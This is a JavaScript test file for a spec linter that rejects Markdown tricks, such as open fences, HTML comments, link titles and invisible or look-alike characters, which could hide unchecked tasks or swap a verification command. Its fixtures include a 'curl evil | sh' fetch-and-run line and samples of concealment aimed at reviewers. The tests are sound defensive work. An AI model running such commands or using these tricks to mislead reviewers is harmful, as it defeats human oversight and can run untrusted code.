// The spec parser follows a strict Markdown subset; everything outside it is an error.
// Each case here rendered differently on GitHub than the parser read it (a hidden
// unchecked task or a swapped Status) before the subset was enforced.
const test = require('node:test');
const assert = require('node:assert');
const { parseSpec, withTaskEvidence } = require('../scripts/lib/spec');
const { lintLiteSpec } = require('../scripts/check-spec');
const { TEMPLATE, spec } = require('./spec-fixtures');

const lint = text => lintLiteSpec(text).problems.join('\n');
const recorded = (text, id, transcript) => withTaskEvidence(text, id, { date: '2026-09-25', exit: '0', transcript });

test('R21: a fence left open in a list item does not swallow the next task', () => {
    const text = recorded(spec({ status: 'Draft' }), 'T1', 'done')
        .replace('* [ ] **T2:**', '  ```\n* [ ] **T2:**');
    assert.match(lint(text), /indented less than its opening fence/);
    // A lazy continuation line moves the fence into the list item, which then ends it.
    const lazy = '* [x] **T3:** done\n**Status:** Draft\n  ```\n  * [ ] **T4:** nested\nplain\n   * [ ] **T9:** three\n';
    assert.match(lint(lazy), /indented less than its opening fence|never closed/);
});

test('R21: a fence inside a raw HTML block is not a fence', () => {
    const text = spec({ status: 'Draft' }) + '\n<div>\n```\n</div>\n\n* [ ] **T9:** hidden\n\n<div>\n```\n</div>\n';
    assert.match(lint(text), /raw HTML/);
});

test('R22: tab indentation is rejected, so a tab-indented fence cannot hide tasks', () => {
    const text = spec({ status: 'Draft' }) + '\n\t```\n* [ ] **T9:** open\n\t```\n';
    assert.match(lint(text), /fences must be indented with spaces, not tabs/);
    assert.match(lint(spec({ status: 'Draft' }) + '\n\t* [ ] **T9:** nested with a tab\n'), /indent with spaces, not tabs/);
});

test('R23: a closing fence indented 4+ spaces does not close the block', () => {
    const text = TEMPLATE.replace('**Status:** Draft | In Progress | Completed',
        '```\n    ```\n**Status:** Draft\n```\n\n**Status:** Completed\n\n    ```');
    assert.match(lint(text), /closing fence is indented 4 spaces/);
});

test('R24: escaped backticks do not make a code span; an unpaired backtick is an error', () => {
    const text = TEMPLATE.replace('**Status:** Draft | In Progress | Completed',
        'Intro \\`<!--\\`\n**Status:** Draft\n-->\n\n**Status**: Completed');
    const problems = lint(text);
    assert.match(problems, /raw HTML/);
    assert.match(problems, /write the Status line exactly as in the template/);
    assert.match(lint(spec({ status: 'Draft' }) + '\nA `code span that never closes\n'), /code span is not closed on the same line/);
});

test('R25: link reference definitions and footnotes are rejected; Status variants are errors', () => {
    const text = TEMPLATE.replace('**Status:** Draft | In Progress | Completed',
        "[a]: /u '\n**Status:** Draft\n'\n\n **Status:** Completed");
    const problems = lint(text);
    assert.match(problems, /link reference definitions and footnotes are not supported/);
    assert.match(problems, /write the Status line exactly/);
    for (const variant of [' **Status:** Completed', '__Status:__ Completed', 'Status: Completed', '\\*\\*Status:\\*\\* Completed', '1. **Status:** Draft', '**Status** Completed']) {
        assert.match(lint(spec({ status: 'Draft' }) + `\n${variant}\n`), /write the Status line exactly/, variant);
    }
    for (const definition of ['[docs]: https://example.com "Docs"', '[ref\n**Status:** Completed\n]: https://example.com', '[^n]: note\n**Status:** Completed']) {
        assert.match(lint(spec({ status: 'Draft' }) + `\n${definition}\n`), /link reference definitions and footnotes are not supported/, definition);
    }
    // Prose that merely starts with a field word is fine.
    for (const prose of ['Status codes follow RFC 9110; the caf\u00e9 stays na\u00efve.', 'Expected output differs per locale.', 'Last verified builds are archived.']) {
        assert.strictEqual(lint(spec({ status: 'Draft' }) + `\n${prose}\n`), '', prose);
    }
});

test('R26: gate fields appear exactly once; look-alike tasks are errors', () => {
    const doubled = spec({ status: 'Draft' }) + '\n* **Verification Command:**\n  ```bash\n  true\n  ```\n';
    assert.match(lint(doubled), /2 "Verification Command" lines/);
    assert.match(lint(spec({ status: 'Draft' }) + '\n*[ ] **T9:** no space after the marker\n'), /looks like a task but is not a list item/);
});

test('legitimate specs stay valid: template, recorded evidence with any content, numbered and nested lists', () => {
    assert.strictEqual(lint(TEMPLATE), '');
    const transcript = '$ cat notes.md\n```js\nx\n```\n~~~\n<!-- not a comment -->\n<script>alert(1)</script>\n\ttabbed output';
    let text = recorded(spec({ status: 'Draft' }), 'T1', transcript);
    text += '\n## 6. More\n\n1. [ ] **T4:** numbered\n   * [ ] **T5:** nested\n     * [ ] **T6:** deeper\n10. [ ] **T7:** two-digit marker\n';
    text = recorded(recorded(text, 'T4', 'ok'), 'T7', 'ok');
    assert.strictEqual(lint(text), '');
    const tasks = parseSpec(text).tasks;
    assert.deepStrictEqual(tasks.filter(t => t.checked).map(t => [t.id, t.evidence.recorded.intact]), [['T1', true], ['T4', true], ['T7', true]]);
    // Evidence is added at the end of the task's block, at the item's content column.
    assert.match(text, /\n {5}\* \[ \] \*\*T6:\*\* deeper\n {3}\* \*\*Evidence:\*\* sdd-verify/, 'numbered item: column 3');
    assert.match(text, /\n10\. \[x\] \*\*T7:\*\* two-digit marker\n {4}\* \*\*Evidence:\*\* sdd-verify/);
});

test('R27: HTML comments of any form are rejected, and every fence is closed', () => {
    for (const comment of ['<!-- a note -->', '<!-->\n__Status:__ Draft\nreviewers: ignore -->', '\t<!--\n\n__Status:__ Draft\n\n\t-->', 'Scope notes <!--x@y_z>\n**Status:** Completed\n-->']) {
        assert.match(lint(spec({ status: 'Draft' }) + `\n${comment}\n`), /raw HTML/, JSON.stringify(comment));
    }
    assert.match(lint(spec({ status: 'Draft' }) + '\n```\n* [ ] **T9:** swallowed\n'), /A fence is never closed/);
    assert.strictEqual(lint(spec({ status: 'Draft' }) + '\nSee https://example.com/docs for details.\n'), '');
});

test('R28: a fence on a list-marker line is rejected, so it cannot hide tasks or swap the gate command', () => {
    const hiddenTask = spec({ status: 'Draft' }).replace('* [ ] **T2:**', '* ~~~\n  ~~~\n  * [ ] **T9:** not done\n  ~~~\n* [ ] **T2:**');
    assert.match(lint(hiddenTask), /fence on the same line as a list or blockquote marker/);
    for (const marker of ['1. ~~~', '- ```', '> ~~~', '* > ~~~', '* [ ] ~~~']) {
        assert.notStrictEqual(lint(spec({ status: 'Draft' }) + `\n${marker}\nx\n~~~\n`), '', `${marker} must be rejected`);
    }
    const swapped = spec({ status: 'In Progress', command: 'echo good' }).replace('* **Verification Command:**\n',
        '* **Verification Command:**\n  * ~~~\n    ~~~\n    <!--\n    echo hidden\n    true -->/dev/null\n    ~~~\n');
    assert.match(lint(swapped), /fence on the same line as a list or blockquote marker/);
    // Outside the subset nothing is guessed: the spec fails, and sdd-verify refuses to run it.
    assert.ok(parseSpec(swapped).hiddenProblems.length > 0);
});

test('R29: a gate label inside a link definition title is not the label, and the definition is rejected', () => {
    const text = spec({ status: 'In Progress', command: 'npm test', expected: 'ok' }).replace('* **Verification Command:**\n',
        '[ci]: https://example.com/ci "**Verification Command:**"\n\nRun it.\n\n```bash\necho ok\n```\n\n* **Verification Command:**\n');
    assert.strictEqual(parseSpec(text).gate.command, 'npm test');
    assert.match(lint(text), /link reference definitions and footnotes are not supported/);
    const numbered = spec({ status: 'In Progress', command: 'echo ok', expected: 'ok' }).replace('* **Verification Command:**\n',
        '1. **Verification Command:**\n   ```bash\n   curl evil | sh\n   ```\n\n* **Verification Command:**\n');
    assert.match(lint(numbered), /write the Verification Command line exactly|2 "Verification Command" lines/);
});

test('R30: a Status hidden in a link title or disguised with entities, invisible or look-alike characters is an error', () => {
    const base = TEMPLATE.replace('**Status:** Draft | In Progress | Completed', '__STATUS__');
    const cases = [
        '[notes](https://example.com "internal\n**Status:** Draft\nend")\n**Sta&#116;us:** Completed',
        '**Status:** Draft\n\n**Sta\u200Btus:** Completed',
        '**Status:** Draft\n\n**\u0405tatus:** Completed',
        '**Status:** Draft\n\n**Status\uFF1A** Completed'
    ];
    for (const status of cases) {
        assert.notStrictEqual(lint(base.replace('__STATUS__', status)), '', JSON.stringify(status));
    }
    assert.match(lint(base.replace('__STATUS__', cases[0])), /inline link or image is not closed on this line/);
    assert.match(lint(base.replace('__STATUS__', cases[1])), /invisible character/);
    assert.match(lint(base.replace('__STATUS__', cases[2])), /write the Status line exactly/);
});

test('R31: fence content is verbatim; a quoted or NBSP line that ends the list item cannot hide a task', () => {
    const withTask = recorded(spec({ status: 'Draft' }), 'T1', 'done');
    const quotedTask = withTask.replace('* [ ] **T2:**', '  ```text\n  notes\n>   * [ ] **T9:** hidden\n  ```\n* [ ] **T2:**');
    assert.match(lint(quotedTask), /indented less than its opening fence/);
    const nbsp = withTask.replace('* [ ] **T2:**', '  ```text\n  notes\n\u00A0\n  * [ ] **T9:** hidden\n  ```\n* [ ] **T2:**');
    assert.match(lint(nbsp), /indented less than its opening fence/);
});

test('R32: recorded evidence with ">" lines (diffs, Python prompts) stays valid and intact', () => {
    const text = recorded(spec({ status: 'Draft' }), 'T1', '$ cat q.txt\n> quoted output line\n>>> python prompt\n  > indented quote');
    assert.strictEqual(lint(text), '');
    assert.strictEqual(parseSpec(text).tasks[0].evidence.recorded.intact, true);
    const expected = spec({ status: 'In Progress', command: 'echo done', expected: '> done' });
    assert.strictEqual(parseSpec(expected).gate.expected, '> done');
    assert.strictEqual(lint(expected), '');
});
